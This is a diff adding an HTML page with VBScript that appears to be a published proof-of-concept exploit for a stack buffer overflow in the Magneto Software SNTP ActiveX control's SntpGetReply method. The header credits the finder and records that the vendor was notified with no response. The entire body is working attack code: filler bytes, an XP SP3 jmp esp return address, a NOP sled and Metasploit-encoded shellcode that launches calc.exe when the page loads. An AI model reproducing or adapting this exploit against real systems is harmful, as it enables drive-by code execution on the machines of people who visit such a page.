@@ -1,0 +1,53 @@
+<html>
+<object classid='clsid:A3010B66-C229-11D5-B7BA-00C0F02DFC67' id='target' /></object>
+<script language='vbscript'>
+'Magneto Software SNTP ActiveX SntpGetReply BOF
+'Discovered by:  s4squatch
+'Site: www.securestate.com
+'File Name = SKSntp.ocx
+'www:  http://www.magnetosoft.com/products/sksntp/sksntp_features.htm
+'Download:  http://www.magnetosoft.com/downloads/sksntp_setup.exe
+'Vendor Notified: 02/02/10 --> NO RESPONSE
+'Vendor Notified: 02/11/10 --> NO RESPONSE
+'Vendor Notified: 02/17/10 --> NO RESPONSE
+'Published 04/13/10
+'Function SntpGetReply ( ByVal bstrSntpServer As String ,  ByRef pvarStatus As Variant ,  ByRef varSntpData As Variant ) As Long"
+'memberName = "SntpGetReply"
+'progid = "SKSNTPLib.SKSntp"
+'Tested with IE7 and XPSP3
+
+buff = String(264, "A")													'buff
+eip = unescape("%f3%30%9d%7c")									'jmp esp 7c9d30f3 shell32.dll XP SP3
+nopsled = String(16, unescape("%90"))
+
+'win32_exec -  EXITFUNC=seh CMD=calc.exe Size=338 Encoder=Alpha2 http://metasploit.com
+shellcode =	unescape("%eb%03%59%eb%05%e8%f8%ff%ff%ff%49%49%49%49%48%49") & _
+						unescape("%49%49%49%49%49%49%49%49%49%49%49%49%51%5a%6a%68") & _
+						unescape("%58%50%30%42%31%42%41%6b%41%41%78%32%41%42%32%42") & _
+						unescape("%41%30%42%41%41%58%38%41%42%50%75%59%79%39%6c%4a") & _
+						unescape("%48%50%44%63%30%35%50%43%30%4c%4b%57%35%77%4c%4c") & _
+						unescape("%4b%51%6c%35%55%64%38%77%71%6a%4f%4c%4b%62%6f%45") & _
+						unescape("%48%4e%6b%31%4f%45%70%55%51%6a%4b%73%79%6e%6b%70") & _
+						unescape("%34%6c%4b%46%61%7a%4e%70%31%4b%70%4e%79%6e%4c%6c") & _
+						unescape("%44%49%50%52%54%67%77%5a%61%59%5a%34%4d%55%51%6f") & _
+						unescape("%32%4a%4b%79%64%37%4b%51%44%41%34%35%54%71%65%6d") & _
+						unescape("%35%4e%6b%53%6f%47%54%65%51%4a%4b%31%76%4e%6b%46") & _
+						unescape("%6c%30%4b%6e%6b%51%4f%75%4c%54%41%58%6b%4c%4b%77") & _
+						unescape("%6c%6e%6b%66%61%58%6b%6d%59%33%6c%46%44%46%64%6a") & _
+						unescape("%63%35%61%6b%70%71%74%6e%6b%63%70%54%70%6f%75%6f") & _
+						unescape("%30%54%38%56%6c%4c%4b%61%50%36%6c%4e%6b%34%30%35") & _
+						unescape("%4c%4c%6d%6e%6b%43%58%75%58%58%6b%54%49%4c%4b%4d") & _
+						unescape("%50%6c%70%43%30%57%70%55%50%6e%6b%32%48%35%6c%71") & _
+						unescape("%4f%67%41%6b%46%53%50%56%36%6b%39%48%78%4d%53%4f") & _
+						unescape("%30%71%6b%32%70%33%58%4c%30%4d%5a%56%64%43%6f%52") & _
+						unescape("%48%6a%38%4b%4e%4c%4a%66%6e%31%47%4b%4f%6b%57%61") & _
+						unescape("%73%70%61%30%6c%71%73%64%6e%70%65%73%48%72%45%35") & _
+						unescape("%50%68")
+
+statics_wet_dream = buff + eip + nopsled + shellcode
+
+arg2="defaultV"
+arg3="defaultV"
+target.SntpGetReply statics_wet_dream ,arg2 ,arg3
+
+</script>
